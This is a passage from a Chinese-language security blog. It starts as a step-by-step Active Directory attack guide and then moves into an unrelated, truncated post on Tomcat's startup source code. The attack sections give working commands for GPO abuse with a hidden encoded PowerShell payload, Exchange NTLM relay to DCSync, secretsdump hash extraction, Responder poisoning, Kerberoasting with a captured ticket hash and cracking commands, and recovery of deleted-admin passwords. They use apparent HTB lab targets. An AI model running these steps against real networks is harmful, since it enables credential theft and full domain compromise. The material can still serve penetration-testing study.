<h1 id="0x06、-不安全的GPO权限"><a href="#0x06、-不安全的GPO权限" class="headerlink" title="0x06、 不安全的GPO权限"></a>0x06、 不安全的GPO权限</h1><p>原理及GPO枚举：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7724#toc-8">https://xz.aliyun.com/t/7724#toc-8</a><br>枚举有GPO修改权限（write Property）的用户</p>
<p>使用PowerView的New-GPOImmediateTask 函数进行利用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-GPOImmediateTask -TaskName Debugging -GPODisplayName SecurePolicy -CommandArguments &#x27;-NoP -NonI -W Hidden -Enc ‘payload’ -Force</span><br></pre></td></tr></table></figure>

<p>-TaskName是必需的参数，-Command 指定的命令来运行（默认为powershell.exe），-CommandArguments 指定给定的二进制的参数。schtask .xml会复制到-GPOname或-GPODisplayname参数确定的适当位置。<br>默认情况下，该功能将在复制前提示您，但是可以使用-Force禁止显示。payload这里可以直接用empire生成的base64的paylaod<br>执行完成之后删除schtask .xml：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-GPOImmediateTask -Remove -Force -GPODisplayName SecurePolicy</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/rasta-mouse/GPO-Abuse">Github中的另外利用方式：</a></p>
<h1 id="0x07、-不安全的ACLs权限"><a href="#0x07、-不安全的ACLs权限" class="headerlink" title="0x07、 不安全的ACLs权限"></a>0x07、 不安全的ACLs权限</h1><p>原理及ACLs枚举：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7724#toc-9">https://xz.aliyun.com/t/7724#toc-9</a><br>对域对象有WriteDacl权限&#x3D;&#x3D;&#x3D;&gt;DCSync</p>
<p>Exchange提权就是最好的ACL滥用的例子，可结合下面的EXchange进一步理解</p>
<h1 id="0x08、Exchange"><a href="#0x08、Exchange" class="headerlink" title="0x08、Exchange"></a>0x08、Exchange</h1><p>原理 ：</p>
<p>Exchange Windows Permissions组成员在域内具有WriteDacl权限，将该组任意集成组WriteDacl权限的成员身份中继到LDAP后，可以修改域对象的ACL授予用户更高级别的访问权限，执行DCSync</p>
<p>也就是利用Exchange默认高权限账户进行LDAP中继授予用户DCSync权限</p>
<p>漏洞利用： net group 查看用户组</p>
<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200503105810-ebdd18de-8ce9-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200503105810-ebdd18de-8ce9-1.png" alt="img"></a></p>
<p>或者当前用户不在Exchange Permissions组中，但在Account Operator中（该组的成员能操作用户管理员所属域的账号和组，并可设置其权限。但是该组成员无法修改Administrators及Operators组及权限），可以添加一个用户并加入到Exchange Permissions<br>添加用户tw：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$pass = ConvertTo-SecureString &quot;password&quot; -AsPlainText -Force</span><br><span class="line">New-ADUser tw -AccountPassword $pass -Enabled $True</span><br></pre></td></tr></table></figure>

<p>将用户添加到Exchange Permissions组</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Exchange Windows Permissions&quot; svc-alfresco /add </span><br><span class="line">或：</span><br><span class="line">Import-Module ActiveDirectory</span><br><span class="line">Add-ADGroupMember -Identity &quot;Exchange Windows Permissions&quot; -Members  tw</span><br></pre></td></tr></table></figure>

<p>检查是否已成功添加</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Exchange Windows Permissions&quot; /domain</span><br></pre></td></tr></table></figure>

<p>使用ntlmrelayx进行ntlm中继：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python ntlmrelayx.py -t  ldap://10.10.10.161 --escalate-user tw</span><br></pre></td></tr></table></figure>

<p>运行该 中继 命令之后，可通过浏览器访问本地IP进行连接（输入tw账户密码），也可使用prieexchange.py进行连接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python privexchange.py  -ah 10.10.16.21  10.10.10.161   -u tw-p password -d htb.local</span><br></pre></td></tr></table></figure>

<p>（10.10.16.21为我kali ip）</p>
<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200503110002-2ea0b3f6-8cea-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200503110002-2ea0b3f6-8cea-1.png" alt="img"></a></p>
<p>连接成功之后，使用secretdump.py导出域控hash #######时间蛮久的，需要出现上图提示</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump htb.local/tw:password@10.10.10.161 -just-dc</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200503110011-341a14a8-8cea-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200503110011-341a14a8-8cea-1.png" alt="img"></a></p>
<h1 id="0x09、LLMNR-NBT-NS"><a href="#0x09、LLMNR-NBT-NS" class="headerlink" title="0x09、LLMNR&#x2F;NBT-NS"></a>0x09、LLMNR&#x2F;NBT-NS</h1><p>投毒原理：如果DNS服务器解析失败，则要求解析的系统使用LLMNR（UDP 5355）或NBNS（UDP 137）在Windows系统上的网段上广播问题或查询。而后攻击者做出响应，请求系统将根据广播期间使用的服务（例如FTP）提供Net-NTLM哈希或明文凭据。</p>
<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200503110139-68b7f608-8cea-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200503110139-68b7f608-8cea-1.png" alt="img"></a></p>
<p>使用Responer执行监听，等待域控触发解析错误</p>
<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200503110155-725850a4-8cea-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200503110155-725850a4-8cea-1.png" alt="img"></a></p>
<p><a target="_blank" rel="noopener" href="http://www.ethicalpentest.com/2018/04/llmnr-and-nbt-ns-poisoning-attack-using-metasploit.html">也可使用MSF操作</a></p>
<h1 id="0x10、Kerberoasting"><a href="#0x10、Kerberoasting" class="headerlink" title="0x10、Kerberoasting"></a>0x10、Kerberoasting</h1><p>原理： 服务主体名称（SPN）用于唯一标识Windows服务的每个实例。为了支持Kerberos身份验证，SPN与至少一个服务登录帐户相关联<br>Kerberoasting利用点在于Client使用有效的TGT向TGS请求Server的Kerberos令牌，TGS在KDC数据库中查找SPN，并使用与SPN关联的服务帐户对票证进行加密并发送给Client。然而这里TGS加密方式为RC4_HMAC_MD5，使用Server端的NTLM hash进行加密（使破解成为可能）<br>此时攻击者借用一个有效的域用户身份请求一个或多个SPN的Kerberos令牌（加密后的TGS），然后进行离线破解得到SPN账户hash（这个过程甚至不用与目标SPN产生交互，即没有已被检测的流量产生，增强攻击的隐蔽性）<br>假若使用的是HTTP（默认使用的是HTTPS），还可以通过捕获网络流量得到Kerberos令牌，然后进行离线破解攻击：<br>扫描域中设置了SPN值的用户帐户。<br>SPN账户格式：serviceclass&#x2F;host:port&#x2F;servicename —&gt;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[1]setspn用法： setspn官方文档： https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)    </span><br><span class="line">setspn.exe -T test -q */*     ###查找test域中所有SPN  </span><br><span class="line">[2]dsquery（需要下载），dsquery官方文档： https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952(v=ws.11)</span><br><span class="line">dsquery * &quot;ou=domain controllers,dc=test,dc=com&quot; -filter &quot;(&amp;(objectcategory=computer) (servicePrincipalName=*))&quot; -attr distinguishedName servicePrincipalName &gt; spns.txt</span><br><span class="line">[3][powershell](https://social.technet.microsoft.com/wiki/contents/articles/18996.active-directory-powershell-script-to-list-all-spns-used.aspx &quot;powershell&quot;)  </span><br><span class="line">get-aduser -filter &#123;AdminCount -eq 1&#125; -prop * | select name,created,passwordlastset,lastlogondate</span><br></pre></td></tr></table></figure>

<p>使用SPN值从AD请求服务票证</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Add-Type –AssemblyName System.IdentityModel</span><br><span class="line">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken ArgumentList MSSQLSvc/jefflab-sql02.jefflab.local:1433</span><br></pre></td></tr></table></figure>

<p>返回服务票证并将其存储在系统的内存中，可以直接在当前窗口运行mimikatz导出内存中的票证</p>
<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200503111105-ba043728-8ceb-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200503111105-ba043728-8ceb-1.png" alt="img"></a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Kerberos::list /export</span><br></pre></td></tr></table></figure>

<p>导出票证然后用<a target="_blank" rel="noopener" href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py">tgsrecrack.py</a>破解</p>
<p>上边的是从原理出发的实验步骤，现在有很多便捷的脚本，<br>如impacket套件中的<a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py">GetUserSPNs.py</a><br>empire中的<a target="_blank" rel="noopener" href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1">Kerberoast.ps1</a><br>效果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/tools/impacket/examples$ ./GetUserSPNs.py  -request active.local/svc_tgsImpacket v0.9.21.dev1 - Copyright 2020 SecureAuth CorporationPassword:ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=local  2018-07-18 15:06:40.351723  2018-07-30 13:17:40.656520             $krb5tgs$23$*Administrator$ACTIVE.local$active/CIFS~445*$d579b3f37d64117826f6a1265fe67fe8$0726fa41dbb28f4de22f52de37fda1b5cc8077e75f6871ead07aea2735ae8c5538e5de78c0e8818c6d1bb64780350d8adf11a482706eaee768e359b0a19d2aa5fb067b147a821f7306f418e3212d640c4626a731bab06387eecaeaa89bc85112c4e70c3ecf6922eacd77521bfd84e23f42357ee565d29e4625af7b766af6b0a9d7db8573eef71a0933eef456ea08f86559a1af439f189476c29f9084748334cf1a0dc02c67cb95ef85eb57c881c2a999e49c602dd9b08ef5e0b2df2d36dd02f7b91efc85783a7c22477e634803b3ac2792d89b0db3440ed43d19367a3cb4365bb064ba8a198ec9b6e21f93de14447262f5fc1b45e815d2b321a1b6a31b27f7d6b62d23d7172378a62156c700c9f959ff4e3cfcf803c240397ca7652c4376cc88c7722895f488a6baa8bfd1bc67a68c0b66a492beb62d8fb36797e941c9e9de03e39a06799fa6d8508eaf595e36001f754cad416c95811b01f3f0d9227cf20c66e91ed48408dc393a3b11b4eb9083b16afb27ca5cb663fc0a8f3d68ec41c941911ea95e811e9337492f24f48587040b49adb733e49fdf0dc76583a9ee9d9deda4269d35586390af2e58b78a6c8c4f25daa11d740277bd53d7272a135dbcdbe9ae9ed610683a26f320f7026156370b71ec1f8681fa0690196a5bfbec720f325475c09d5681140580468c4773deced7a30844efa2ae0680c1f923e1f7f3ba205948c55444324b8dd290b668c1e4d8706e890e2f451e16e556c2f82cbc053558088c40961fc59ddba0586fd6cb11da904f07ed75d3ee1698c6ae2b052c7ea8a9317434ed560e46114b6720f98c147cb63eda787c2c76356213d565e3aa77adf59f7d491a2bf791f65e27aa13bba8d9aa7000329949afa88c33d6d1d1d1e756fb8e0ed009388f22e46599179a71f3cb920a90bb99fc34db3adbf5599285df541ec3f3ed1504268dbd3a6663348e05e318732a25c80892225fba017ea9682ac01ef8324aa4913c9dd623abc9086e94c05a39c104eb86deeba0d1f71d23bf63e8c557e6c0a8c55e743f1de8f598784b8c131efa8d6a6d0bce281912988e7dd072fbcf3ab9dae72452b1e106619e88b932d3cc071488e043395bb7c15ee0d262123e52029905bb9f3f1f0e757043fb618ac0153e85b52b57df68ab5db050fc637eecff12d1cfb83f62f3fe885761514cd6bfbc47233c47985225fe2f0b9bfd7a0e496b581ec995aa9d14a0b7b6b26e485bc81546d65c88c117dc8593c90b</span><br></pre></td></tr></table></figure>

<p>破解：<br>[1 hashcat]: hashcat -a 0 -m 13100 active.hash &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt –force<br>[2 john] ： sudo john active.hash -w “&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt”</p>
<h1 id="0x11、AD-recyle-Bin"><a href="#0x11、AD-recyle-Bin" class="headerlink" title="0x11、AD recyle Bin"></a>0x11、AD recyle Bin</h1><p>使用回收站还原用户，或获取用户旧密码进行碰撞</p>
<p>前提：需要域内启用回收站功能，且用户在AD Recyle Bin 组中未启用启用回收站和启用回收站删除对象对比</p>
<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200503111210-e094adb4-8ceb-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200503111210-e094adb4-8ceb-1.png" alt="img"></a></p>
<p>图1：启用回收站之前已删除的Active Directory对象的生命周期图</p>
<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200503111219-e5e0735c-8ceb-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200503111219-e5e0735c-8ceb-1.png" alt="img"></a></p>
<p>2：启用回收站后已删除的Active Directory对象的生命周期</p>
<p>启用AD回收站：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enable-ADOptionalFeature –Identity ‘CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=www,DC=domain,DC=com’ –Scope ForestOrConfigurationSet –Target ‘www.domain.com’</span><br></pre></td></tr></table></figure>

<p>查看删除用户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ADObject -filter &#x27;isDeleted -eq $true -and name -ne &quot;Deleted Objects&quot;&#x27; -includeDeletedObjects</span><br></pre></td></tr></table></figure>

<p>结果示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Deleted           : True</span><br><span class="line">DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local</span><br><span class="line">Name              : TempAdmin                    </span><br><span class="line">                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059</span><br><span class="line">ObjectClass       : user</span><br><span class="line">ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059</span><br></pre></td></tr></table></figure>

<p>尝试还原已删除账户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Restore-ADObject -Identity &#x27;f0cc344d-31e0-4866-bceb-a842791ca059&#x27;    ###使用ObjectGUID进行还原</span><br><span class="line">或</span><br><span class="line">Get-ADObject -Filter &#123;displayName -eq  &quot;TempAdmin&quot;&#125; IncludeDeletedObjects | Restore-ADObject</span><br></pre></td></tr></table></figure>

<p>查询ms-mcs-admpwd</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ADObject -ldapFilter:&quot;(msDS-LastKnownRDN=*)&quot; –IncludeDeletedObjects -Property ms-mcs-admpwd</span><br></pre></td></tr></table></figure>

<p>查看有关于特定账户的全部属性信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Get-ADObject -Filter &#123;displayName -eq &quot;TempAdmin&quot;&#125; -IncludeDeletedObjects -Properties *</span><br><span class="line">cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz</span><br></pre></td></tr></table></figure>

<p>这里存在被删除的临时管理员TempAdmin的LegacyPassword</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://qwq0qwq.github.io/2023/08/11/Tomcat%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="QWQ0QWQ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="QWQ0QWQ's blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | QWQ0QWQ's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2023/08/11/Tomcat%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B/" class="post-title-link" itemprop="url">Tomcat启动过程</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2023-08-11 07:56:52 / Modified: 07:57:38" itemprop="dateCreated datePublished" datetime="2023-08-11T07:56:52+08:00">2023-08-11</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="Tomcat-启动过程：初始化和启动流程"><a href="#Tomcat-启动过程：初始化和启动流程" class="headerlink" title="Tomcat - 启动过程：初始化和启动流程"></a>Tomcat - 启动过程：初始化和启动流程</h1><blockquote>
<p>在有了Tomcat架构设计和源码入口以后，我们便可以开始真正读源码了。</p>
</blockquote>
<h2 id="总体流程"><a href="#总体流程" class="headerlink" title="# 总体流程"></a><a href="#%E6%80%BB%E4%BD%93%E6%B5%81%E7%A8%8B">#</a> 总体流程</h2><blockquote>
<p>很多人在看框架代码的时候会很难抓住重点的，而一开始了解整体流程会很大程度提升理解的效率。</p>
</blockquote>
<p>我们看下整体的初始化和启动的流程，在<strong>理解的时候可以直接和Tomcat架构设计中组件关联上</strong>：</p>
<p><img src="https://pdai.tech/images/tomcat/tomcat-x-start-1.png" alt="img"></p>
<h2 id="代码浅析"><a href="#代码浅析" class="headerlink" title="# 代码浅析"></a><a href="#%E4%BB%A3%E7%A0%81%E6%B5%85%E6%9E%90">#</a> 代码浅析</h2><p>看了下网上关于Tomcat的文章，很多直接关注在纯代码的分析，这种是很难的；我建议你一定要把代码加载进来自己看一下，然后这里我把它转化为核心的几个问题来帮助你理解。</p>
<h3 id="Bootstrap主入口？"><a href="#Bootstrap主入口？" class="headerlink" title="# Bootstrap主入口？"></a><a href="#bootstrap%E4%B8%BB%E5%85%A5%E5%8F%A3">#</a> Bootstrap主入口？</h3><p>Tomcat源码就从它的main方法开始。Tomcat的main方法在org.apache.catalina.startup.Bootstrap 里。 如下代码我们就是创建一个 Bootstrap 对象，调用它的 init 方法初始化，然后根据启动参数，分别调用 Bootstrap 对象的不同方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Bootstrap</span> &#123;</span><br><span class="line">    ……</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Daemon object used by main.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">daemonLock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">    </span><br><span class="line">    ……</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Main method and entry point when starting Tomcat via the provided</span></span><br><span class="line"><span class="comment">     * scripts.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> args Command line arguments to be processed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line">        <span class="comment">// 创建一个 Bootstrap 对象，调用它的 init 方法初始化</span></span><br><span class="line">        <span class="keyword">synchronized</span> (daemonLock) &#123;</span><br><span class="line">            <span class="keyword">if</span> (daemon == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// Don&#x27;t set daemon until init() has completed</span></span><br><span class="line">                <span class="type">Bootstrap</span> <span class="variable">bootstrap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Bootstrap</span>();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    bootstrap.init();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">                    handleThrowable(t);</span><br><span class="line">                    t.printStackTrace();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                daemon = bootstrap;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// When running as a service the call to stop will be on a new</span></span><br><span class="line">                <span class="comment">// thread so make sure the correct class loader is used to</span></span><br><span class="line">                <span class="comment">// prevent a range of class not found exceptions.</span></span><br><span class="line">                Thread.currentThread().setContextClassLoader(daemon.catalinaLoader);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 根据启动参数，分别调用 Bootstrap 对象的不同方法</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">&quot;start&quot;</span>; <span class="comment">// 默认是start</span></span><br><span class="line">            <span class="keyword">if</span> (args.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                command = args[args.length - <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (command.equals(<span class="string">&quot;startd&quot;</span>)) &#123;</span><br><span class="line">                args[args.length - <span class="number">1</span>] = <span class="string">&quot;start&quot;</span>;</span><br><span class="line">                daemon.load(args);</span><br><span class="line">                daemon.start();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (command.equals(<span class="string">&quot;stopd&quot;</span>)) &#123;</span><br><span class="line">                args[args.length - <span class="number">1</span>] = <span class="string">&quot;stop&quot;</span>;</span><br><span class="line">                daemon.stop();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (command.equals(<span class="string">&quot;start&quot;</span>)) &#123;</span><br><span class="line">                daemon.setAwait(<span class="literal">true</span>);</span><br><span class="line">                daemon.load(args);</span><br><span class="line">                daemon.start();</span><br><span class="line">                <span class="keyword">if</span> (<span class="literal">null</span> == daemon.getServer()) &#123;</span><br><span class="line">                    System.exit(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (command.equals(<span class="string">&quot;stop&quot;</span>)) &#123;</span><br><span class="line">                daemon.stopServer(args);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (command.equals(<span class="string">&quot;configtest&quot;</span>)) &#123;</span><br><span class="line">                daemon.load(args);</span><br><span class="line">                <span class="keyword">if</span> (<span class="literal">null</span> == daemon.getServer()) &#123;</span><br><span class="line">                    System.exit(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                System.exit(<span class="number">0</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                log.warn(<span class="string">&quot;Bootstrap: command \&quot;&quot;</span> + command + <span class="string">&quot;\&quot; does not exist.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">            <span class="comment">// Unwrap the Exception for clearer error reporting</span></span><br><span class="line">            <span class="keyword">if</span> (t <span class="keyword">instanceof</span> InvocationTargetException &amp;&amp;</span><br><span class="line">                    t.getCause() != <span class="literal">null</span>) &#123;</span><br><span class="line">                t = t.getCause();</span><br><span class="line">            &#125;</span><br><span class="line">            handleThrowable(t);</span><br><span class="line">            t.printStackTrace();</span><br><span class="line">            System.exit(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Bootstrap如何初始化Catalina的？"><a href="#Bootstrap如何初始化Catalina的？" class="headerlink" title="# Bootstrap如何初始化Catalina的？"></a><a href="#bootstrap%E5%A6%82%E4%BD%95%E5%88%9D%E5%A7%8B%E5%8C%96catalina%E7%9A%84">#</a> Bootstrap如何初始化Catalina的？</h3><p>我们用<code>Sequence Diagram</code>插件来看main方法的时序图，但是可以发现它并没有帮我们画出Bootstrap初始化Catalina的过程，这和上面的组件初始化不符合？</p>
<p><img src="https://pdai.tech/images/tomcat/tomcat-x-start-2.png" alt="img"></p>
<p>让我们带着这个为看下Catalina的初始化的</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 初始化守护进程</span></span><br><span class="line"><span class="comment">  * </span></span><br><span class="line"><span class="comment">  * <span class="doctag">@throws</span> Exception Fatal initialization error</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span 